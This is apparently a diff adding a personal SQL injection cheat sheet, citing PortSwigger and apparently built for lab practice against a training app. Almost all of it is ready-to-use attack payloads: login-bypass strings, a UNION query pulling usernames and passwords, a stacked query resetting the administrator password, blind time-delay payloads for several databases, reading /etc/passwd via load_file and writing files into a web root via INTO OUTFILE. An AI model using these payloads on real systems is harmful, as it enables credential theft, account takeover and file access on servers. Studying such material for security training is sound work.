@@ -1,0 +1,56 @@
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+#Test if vulnerable:
+'
+"
+'-- 
+"--
+
+
+
+UNION SELECT username, password FROM users--
+
+#enumerate tables on most databases:
+	SELECT * FROM information_schema.tables
+
+#SQL 101:
+	• admin' --
+	• admin' #
+	• admin'/*
+	• ' or 1=1--
+	• ' or 1=1#
+	• ' or 1=1/*
+	• ') or '1'='1--
+	• ') or ('1'='1--
+
+#login form:
+examplename';update users set password='letmein' where user='administrator'--
+
+----------------------------------------------
+Test for time delay:
+Oracle: dbms_pipe.receive_message(('a'),10)
+Microsoft: WAITFOR DELAY '0:0:10' 
+MySQL: SELECT sleep(10)
+ProstgreSQL: TrackingId=x'||pg_sleep(10)--
+
+Conditional time delays:
+#You can test a single boolean condition and trigger a time delay if the condition is true.
+-----------
+Oracle:	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+Microsoft:	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+PostgreSQL:	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+MySQL:	SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
+
+
+PostGreSQL concat example:
+	GET /filter?category=Gifts'+UNION+select+NULL,+Username+||+'*'+||+password+from+users-- HTTP/1.1
+
+
+
+Read files:
+	union select null,load_file('/etc/passwd'),null,null,null#
+	union+select+null,load_file('/etc/passwd')--
+
+Upload files:
+	union select null,'example example',null,null into outfile '/var/www/mutillidae/example.txt'#
+	union+select+null,'write1 example2'+into outfile+'/var/www/mutillidae/example.txt'--
